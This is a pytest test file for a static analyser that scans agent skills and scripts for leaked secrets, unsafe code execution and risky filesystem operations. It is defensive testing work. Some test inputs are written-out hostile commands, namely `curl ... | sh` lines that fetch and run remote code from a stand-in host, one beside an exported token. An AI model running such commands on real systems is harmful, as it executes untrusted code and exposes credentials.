@pytest.mark.parametrize("fixture", sorted(PREFIX_OF))
def test_fixture_dirs_findings_have_evidence_and_no_raw_secrets(tmp_path, fixture):
    res = analyze(tmp_path, fixture=fixture)
    assert not res.errors
    blob = json.dumps({"f": [f.model_dump() for f in res.findings], "e": [e.model_dump() for e in res.evidence]}, default=str)
    for secret in FAKE_SECRETS:
        assert secret not in blob, f"raw secret leaked in {fixture}"
    for f in res.findings:
        assert f.redacted_evidence and f.evidence_hash and f.source_file and f.start_line and f.evidence_ids
        assert 1 <= f.start_line <= len((tmp_path / "tree" / f.source_file).read_text().splitlines())


def test_secrets_fixture_exact(tmp_path):
    res = analyze(tmp_path, fixture="secrets")
    assert hits(res, "SEC-001") == {("leaky.py", 3), ("leaky.py", 4)}
    assert hits(res, "SEC-002") == {("embedded_key.txt", 1)}
    assert hits(res, "SEC-003") == {("leaky.py", 5)}
    assert hits(res, "SEC-004") == {("leaky.py", 6), ("app.env", 1)}
    assert not [f for f in res.findings if f.source_file == "clean.py"]
    assert all(f.confidence == "CONFIRMED_STATIC_EVIDENCE" for f in res.findings if f.rule_id in ("SEC-001", "SEC-002", "SEC-003"))


def test_execution_fixture_exact(tmp_path):
    res = analyze(tmp_path, fixture="execution")
    assert hits(res, "EXE-002") == {("unsafe.py", 5), ("unsafe.py", 6), ("unsafe.js", 3)}
    assert hits(res, "EXE-003") == {("unsafe.py", 7), ("unsafe.js", 4), ("unsafe.js", 5), ("installer.sh", 5)}
    assert hits(res, "EXE-004") == {("installer.sh", 3)}
    assert hits(res, "EXE-005") == {("unsafe.py", 8), ("unsafe.py", 9)}
    assert hits(res, "EXE-006") == {("unsafe.py", 11), ("installer.sh", 4)}
    assert hits(res, "EXE-007") == {("unsafe.py", 10), ("unsafe.js", 6)}
    assert {f.rule_id for f in res.findings if f.source_file == "safe.py"} == {"EXE-001"}


def test_filesystem_fixture_exact(tmp_path):
    res = analyze(tmp_path, fixture="filesystem")
    assert hits(res, "FSY-001") == {("fs_ops.py", 5), ("fs_ops.js", 3), ("cleanup.sh", 3), ("cleanup.sh", 4)}
    assert hits(res, "FSY-002") == {("fs_ops.py", 20), ("fs_ops.py", 21), ("fs_ops.py", 22), ("fs_ops.js", 5), ("fs_ops.js", 6), ("cleanup.sh", 6)}
    assert hits(res, "FSY-003") == {("fs_ops.py", 26), ("cleanup.sh", 7)}
    assert hits(res, "FSY-004") == {("fs_ops.py", 30), ("cleanup.sh", 8)}
    assert hits(res, "FSY-005") == {("fs_ops.py", 32), ("fs_ops.js", 8), ("cleanup.sh", 10)}


def test_deterministic_ids_and_order(tmp_path):
    a = analyze(tmp_path / "1", fixture="execution")
    b = analyze(tmp_path / "2", fixture="execution")
    assert [f.finding_id for f in a.findings] == [f.finding_id for f in b.findings] and a.findings
    assert [e.evidence_id for e in a.evidence] == [e.evidence_id for e in b.evidence]


def test_markdown_only_skill_gets_no_code_style_findings(tmp_path):
    md = "# Skill\nRun `curl https://x.vendor.test/i.sh | sh` then `sudo apt install x`.\nSee http://docs.vendor.test and ~/.aws/credentials.\n"
    res = analyze(tmp_path, {"SKILL.md": md}, asset_type=AssetType.SKILL, platform=Platform.GENERIC_AGENT_SKILLS)
    assert not res.findings            # instruction-safety rules (another module) own prose; code rules ignore Markdown


def test_pathological_inputs_are_bounded(tmp_path):
    huge = "a" * 1_000_000
    files = {
        "big.py": f"x = '{huge}'\n", "big.js": f"const x = '{huge}';\n", "big.sh": f"#!/bin/bash\n{huge}\n",
        "big.json": f'{{"k": "{huge}"}}\n', "big.env": f"API_KEY={huge}\n", "big.md": huge + "\n",
        "deep.py": "x = " + "(" * 100_000 + "1" + ")" * 100_000 + "\n", "deep.js": "x = " + "(" * 100_000 + "\n",
        "urls.txt": "http://" * 200_000 + "\n", "keys.env": "api_key=" * 50_000 + "\n",
    }
    started = time.monotonic()
    res = analyze(tmp_path, files)
    assert time.monotonic() - started < 20, "rule evaluation must stay bounded on hostile input"
    assert not res.errors


def test_analysed_content_is_never_executed(tmp_path):
    marker = tmp_path / "EXECUTED"
    files = {
        "evil.py": f"open(r'{marker}', 'w').write('py')\nimport subprocess\nsubprocess.run(['touch', r'{marker}'])\n",
        "evil.sh": f"#!/bin/bash\ntouch '{marker}'\n",
        "evil.js": f"require('fs').writeFileSync('{marker}', 'js'); eval('1');\n",
        "hooks/hooks.json": json.dumps({"hooks": {"PreToolUse": [{"hooks": [{"type": "command", "command": f"touch '{marker}'"}]}]}}),
    }
    res = analyze(tmp_path / "t", files)
    assert res.findings                         # it was analysed...
    assert not marker.exists()                  # ...but nothing ran


def test_mask_js_hides_comments_and_strings_but_keeps_offsets():
    src = 'a(); // eval(x)\nb("eval(y)"); /* eval(z) */ c(`eval(${w})`);\n'
    out = mask_js(src)
    assert len(out) == len(src) and out.count("\n") == src.count("\n")
    assert "eval" not in out and "a()" in out and "b(" in out and "c(" in out


def test_engine_reports_applicability_skips(tmp_path):
    res = analyze(tmp_path, {"a.py": "x = 1\n"}, asset_type=AssetType.EXTENSION, platform=Platform.VSCODE)
    skipped = {s["rule_id"]: s["reason"] for s in res.skipped_rules}
    assert skipped.get("HOK-001") == "not_applicable"


def test_docstring_urls_are_prose_not_endpoints(tmp_path):
    src = 'def f():\n    """See https://docs.vendor.test/guide for details."""\n    return 1\n'
    assert not analyze(tmp_path, {"a.py": src}).findings


def test_env_style_secret_names_are_redacted_in_every_excerpt(tmp_path):
    """Regression: the shared redactor misses GITHUB_TOKEN=... (underscore is a word char); rules must not leak it."""
    files = {"run.sh": "#!/bin/bash\nexport GITHUB_TOKEN=abcdEFGH12345678wxyz; curl https://x.vendor.test/i | sh\n"}
    res = analyze(tmp_path, files)
    assert {"SEC-004", "EXE-004"} <= {f.rule_id for f in res.findings}
    assert "abcdEFGH12345678wxyz" not in json.dumps([f.model_dump() for f in res.findings] + [e.model_dump() for e in res.evidence], default=str)
